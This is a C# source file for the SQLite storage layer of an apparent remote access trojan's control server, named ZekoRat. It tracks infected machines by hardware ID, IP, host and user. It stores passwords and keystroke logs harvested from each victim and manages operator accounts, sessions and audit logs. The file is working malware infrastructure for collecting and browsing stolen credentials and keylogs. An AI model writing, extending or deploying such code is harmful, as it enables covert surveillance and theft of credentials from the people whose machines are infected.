using Microsoft.Data.Sqlite;
using System.Text.Json.Nodes;

namespace ZekoRat.Server;

public static class Store
{
    static string _conn = "Data Source=zekorat.db";

    public static void Init(string path)
    {
        _conn = $"Data Source={path}";
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = """
            PRAGMA journal_mode=WAL;
            CREATE TABLE IF NOT EXISTS agents(
                hwid TEXT PRIMARY KEY, ip TEXT, host TEXT, user TEXT, os TEXT,
                cpu TEXT, ram TEXT, first_seen TEXT, last_seen TEXT, online INTEGER DEFAULT 1);
            CREATE TABLE IF NOT EXISTS passwords(
                id INTEGER PRIMARY KEY AUTOINCREMENT, hwid TEXT, url TEXT, user TEXT,
                pass TEXT, app TEXT, added TEXT);
            CREATE TABLE IF NOT EXISTS keylogs(
                id INTEGER PRIMARY KEY AUTOINCREMENT, hwid TEXT, text TEXT, added TEXT);
            CREATE TABLE IF NOT EXISTS users(
                id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT UNIQUE, salt TEXT, hash TEXT,
                role TEXT, created TEXT, disabled INTEGER DEFAULT 0);
            CREATE TABLE IF NOT EXISTS sessions(
                token TEXT PRIMARY KEY, user_id INTEGER, name TEXT, role TEXT, ip TEXT, ua TEXT,
                created TEXT, last_seen TEXT, expires TEXT, revoked INTEGER DEFAULT 0);
            CREATE TABLE IF NOT EXISTS logs(
                id INTEGER PRIMARY KEY AUTOINCREMENT, ts TEXT, user TEXT, ip TEXT,
                action TEXT, detail TEXT);
            DELETE FROM passwords WHERE id NOT IN (
                SELECT MIN(id) FROM passwords GROUP BY hwid, url, user, pass, app);
            """;
        cmd.ExecuteNonQuery();
    }

    public static SqliteConnection Open()
    {
        var c = new SqliteConnection(_conn);
        c.Open();
        return c;
    }

    static string Now() => DateTime.UtcNow.ToString("s");

    public static void UpsertAgent(AgentSession s)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = """
            INSERT INTO agents(hwid,ip,host,user,os,cpu,ram,first_seen,last_seen,online)
            VALUES($h,$i,$ho,$u,$o,$c,$r,$n,$n,1)
            ON CONFLICT(hwid) DO UPDATE SET ip=$i,host=$ho,user=$u,os=$o,cpu=$c,ram=$r,last_seen=$n,online=1;
            """;
        cmd.Parameters.AddWithValue("$h", s.Hwid);
        cmd.Parameters.AddWithValue("$i", s.RemoteIp);
        cmd.Parameters.AddWithValue("$ho", s.Info["host"]?.ToString() ?? "");
        cmd.Parameters.AddWithValue("$u", s.Info["user"]?.ToString() ?? "");
        cmd.Parameters.AddWithValue("$o", s.Info["os"]?.ToString() ?? "");
        cmd.Parameters.AddWithValue("$c", s.Info["cpu"]?.ToString() ?? "");
        cmd.Parameters.AddWithValue("$r", s.Info["ram"]?.ToString() ?? "");
        cmd.Parameters.AddWithValue("$n", Now());
        cmd.ExecuteNonQuery();
    }

    public static void MarkOffline(string hwid)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "UPDATE agents SET online=0,last_seen=$n WHERE hwid=$h";
        cmd.Parameters.AddWithValue("$h", hwid);
        cmd.Parameters.AddWithValue("$n", Now());
        cmd.ExecuteNonQuery();
    }

    public static void AddKeylog(string hwid, string text)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "INSERT INTO keylogs(hwid,text,added) VALUES($h,$t,$n)";
        cmd.Parameters.AddWithValue("$h", hwid);
        cmd.Parameters.AddWithValue("$t", text);
        cmd.Parameters.AddWithValue("$n", Now());
        cmd.ExecuteNonQuery();
    }

    public static void AddPasswords(string hwid, JsonArray rows)
    {
        using var c = Open();
        using var tx = c.BeginTransaction();
        foreach (var r in rows)
        {
            if (r is not JsonArray a || a.Count < 4) continue;
            using var cmd = c.CreateCommand();
            cmd.Transaction = tx;
            cmd.CommandText = """
                INSERT INTO passwords(hwid,url,user,pass,app,added)
                SELECT $h,$u,$un,$p,$a,$n
                WHERE NOT EXISTS (SELECT 1 FROM passwords
                                  WHERE hwid=$h AND url=$u AND user=$un AND pass=$p AND app=$a);
                """;
            cmd.Parameters.AddWithValue("$h", hwid);
            cmd.Parameters.AddWithValue("$u", a[0]?.ToString() ?? "");
            cmd.Parameters.AddWithValue("$un", a[1]?.ToString() ?? "");
            cmd.Parameters.AddWithValue("$p", a[2]?.ToString() ?? "");
            cmd.Parameters.AddWithValue("$a", a[3]?.ToString() ?? "");
            cmd.Parameters.AddWithValue("$n", Now());
            cmd.ExecuteNonQuery();
        }
        tx.Commit();
    }

    public static JsonArray GetPasswords(string hwid, int limit = 500)
    {
        var arr = new JsonArray();
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "SELECT url,user,pass,app,added FROM passwords WHERE hwid=$h ORDER BY id DESC LIMIT $l";
        cmd.Parameters.AddWithValue("$h", hwid);
        cmd.Parameters.AddWithValue("$l", limit);
        using var r = cmd.ExecuteReader();
        while (r.Read())
            arr.Add(new JsonArray(r.GetString(0), r.GetString(1), r.GetString(2), r.GetString(3), r.GetString(4)));
        return arr;
    }

    public static string GetKeylog(string hwid)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "SELECT text FROM keylogs WHERE hwid=$h ORDER BY id ASC";
        cmd.Parameters.AddWithValue("$h", hwid);
        using var r = cmd.ExecuteReader();
        var sb = new System.Text.StringBuilder();
        while (r.Read()) sb.Append(r.GetString(0));
        return sb.ToString();
    }

    public static JsonArray GetAgents()
    {
        var arr = new JsonArray();
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "SELECT hwid,ip,host,user,os,cpu,ram,last_seen,online FROM agents ORDER BY online DESC, last_seen DESC";
        using var r = cmd.ExecuteReader();
        while (r.Read())
            arr.Add(new JsonObject
            {
                ["hwid"] = r.GetString(0),
                ["ip"] = r.GetString(1),
                ["host"] = r.GetString(2),
                ["user"] = r.GetString(3),
                ["os"] = r.GetString(4),
                ["cpu"] = r.GetString(5),
                ["ram"] = r.GetString(6),
                ["lastSeen"] = r.GetString(7),
                ["online"] = r.GetInt32(8)
            });
        return arr;
    }
    // ─────────────────── users ───────────────────
    public static void EnsureAdmin(string name, string pass)
    {
        using var c = Open();
        using var chk = c.CreateCommand();
        chk.CommandText = "SELECT COUNT(*) FROM users";
        var n = Convert.ToInt64(chk.ExecuteScalar());
        if (n > 0) return;
        var (salt, hash) = Auth.Make(pass);
        using var cmd = c.CreateCommand();
        cmd.CommandText = "INSERT INTO users(name,salt,hash,role,created,disabled) VALUES($n,$s,$h,'admin',$t,0)";
        cmd.Parameters.AddWithValue("$n", name);
        cmd.Parameters.AddWithValue("$s", salt);
        cmd.Parameters.AddWithValue("$h", hash);
        cmd.Parameters.AddWithValue("$t", Now());
        cmd.ExecuteNonQuery();
        AddLog(name, "system", "bootstrap", "tao tai khoan admin dau tien");
    }

    public sealed record UserRow(long Id, string Name, string Salt, string Hash, string Role,
        string Created, bool Disabled);

    public static UserRow? GetUser(string name)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "SELECT id,name,salt,hash,role,created,disabled FROM users WHERE name=$n";
        cmd.Parameters.AddWithValue("$n", name);
        using var r = cmd.ExecuteReader();
        if (!r.Read()) return null;
        return new UserRow(r.GetInt64(0), r.GetString(1), r.GetString(2), r.GetString(3),
            r.GetString(4), r.GetString(5), r.GetInt32(6) != 0);
    }

    public static bool CreateUser(string name, string pass, string role, out string? err)
    {
        err = null;
        if (GetUser(name) is not null) { err = "user da ton tai"; return false; }
        var (salt, hash) = Auth.Make(pass);
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "INSERT INTO users(name,salt,hash,role,created,disabled) VALUES($n,$s,$h,$r,$t,0)";
        cmd.Parameters.AddWithValue("$n", name);
        cmd.Parameters.AddWithValue("$s", salt);
        cmd.Parameters.AddWithValue("$h", hash);
        cmd.Parameters.AddWithValue("$r", role);
        cmd.Parameters.AddWithValue("$t", Now());
        try { cmd.ExecuteNonQuery(); return true; }
        catch (Exception ex) { err = ex.Message; return false; }
    }

    public static bool DeleteUser(long id)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "DELETE FROM users WHERE id=$i AND role<>'admin'";
        cmd.Parameters.AddWithValue("$i", id);
        return cmd.ExecuteNonQuery() > 0;
    }

    public static JsonArray GetUsers()
    {
        var arr = new JsonArray();
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "SELECT id,name,role,created,disabled FROM users ORDER BY id";
        using var r = cmd.ExecuteReader();
        while (r.Read())
            arr.Add(new JsonObject
            {
                ["id"] = r.GetInt64(0),
                ["name"] = r.GetString(1),
                ["role"] = r.GetString(2),
                ["created"] = r.GetString(3),
                ["disabled"] = r.GetInt32(4)
            });
        return arr;
    }

    // ─────────────────── sessions ───────────────────
    public static string CreateSession(long userId, string name, string role, string ip, string ua)
    {
        var token = Auth.NewToken();
        var exp = DateTime.UtcNow.AddHours(12).ToString("s");
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = """
            INSERT INTO sessions(token,user_id,name,role,ip,ua,created,last_seen,expires,revoked)
            VALUES($t,$u,$n,$r,$i,$a,$c,$c,$e,0)
            """;
        cmd.Parameters.AddWithValue("$t", token);
        cmd.Parameters.AddWithValue("$u", userId);
        cmd.Parameters.AddWithValue("$n", name);
        cmd.Parameters.AddWithValue("$r", role);
        cmd.Parameters.AddWithValue("$i", ip);
        cmd.Parameters.AddWithValue("$a", ua);
        cmd.Parameters.AddWithValue("$c", Now());
        cmd.Parameters.AddWithValue("$e", exp);
        cmd.ExecuteNonQuery();
        return token;
    }

    public static AuthUser? GetSessionUser(string token)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = """
            SELECT s.user_id, s.name, s.role, s.expires, s.revoked, u.disabled
            FROM sessions s LEFT JOIN users u ON u.id = s.user_id
            WHERE s.token=$t
            """;
        cmd.Parameters.AddWithValue("$t", token);
        using var r = cmd.ExecuteReader();
        if (!r.Read()) return null;
        if (r.GetInt32(4) != 0) return null;
        if (!r.IsDBNull(5) && r.GetInt32(5) != 0) return null;
        if (DateTime.TryParse(r.GetString(3), out var exp) && exp < DateTime.UtcNow) return null;
        var name = r.GetString(1);
        var role = r.GetString(2);
        return new AuthUser { Id = r.GetInt64(0), Name = name, Role = role, Perms = Auth.PermsFor(role) };
    }

    public static void TouchSession(string token)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "UPDATE sessions SET last_seen=$n WHERE token=$t";
        cmd.Parameters.AddWithValue("$n", Now());
        cmd.Parameters.AddWithValue("$t", token);
        cmd.ExecuteNonQuery();
    }

    public static void RevokeSession(string token)
    {
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "UPDATE sessions SET revoked=1 WHERE token=$t";
        cmd.Parameters.AddWithValue("$t", token);
        cmd.ExecuteNonQuery();
    }

    public static JsonArray GetSessions()
    {
        var arr = new JsonArray();
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = """
            SELECT token,name,role,ip,ua,created,last_seen,expires,revoked
            FROM sessions ORDER BY last_seen DESC LIMIT 100
            """;
        using var r = cmd.ExecuteReader();
        while (r.Read())
            arr.Add(new JsonObject
            {
                ["token"] = r.GetString(0)[..12] + "…",
                ["tokenFull"] = r.GetString(0),
                ["name"] = r.GetString(1),
                ["role"] = r.GetString(2),
                ["ip"] = r.GetString(3),
                ["ua"] = r.GetString(4).Length > 60 ? r.GetString(4)[..60] : r.GetString(4),
                ["created"] = r.GetString(5),
                ["lastSeen"] = r.GetString(6),
                ["expires"] = r.GetString(7),
                ["revoked"] = r.GetInt32(8)
            });
        return arr;
    }

    // ─────────────────── logs ───────────────────
    public static void AddLog(string user, string ip, string action, string detail)
    {
        try
        {
            using var c = Open();
            using var cmd = c.CreateCommand();
            cmd.CommandText = "INSERT INTO logs(ts,user,ip,action,detail) VALUES($t,$u,$i,$a,$d)";
            cmd.Parameters.AddWithValue("$t", Now());
            cmd.Parameters.AddWithValue("$u", user);
            cmd.Parameters.AddWithValue("$i", ip);
            cmd.Parameters.AddWithValue("$a", action);
            cmd.Parameters.AddWithValue("$d", detail);
            cmd.ExecuteNonQuery();
        }
        catch { }
    }

    public static JsonArray GetLogs(int limit = 300)
    {
        var arr = new JsonArray();
        using var c = Open();
        using var cmd = c.CreateCommand();
        cmd.CommandText = "SELECT ts,user,ip,action,detail FROM logs ORDER BY id DESC LIMIT $l";
        cmd.Parameters.AddWithValue("$l", limit);
        using var r = cmd.ExecuteReader();
        while (r.Read())
            arr.Add(new JsonObject
            {
                ["ts"] = r.GetString(0),
                ["user"] = r.GetString(1),
                ["ip"] = r.GetString(2),
                ["action"] = r.GetString(3),
                ["detail"] = r.GetString(4)
            });
        return arr;
    }}
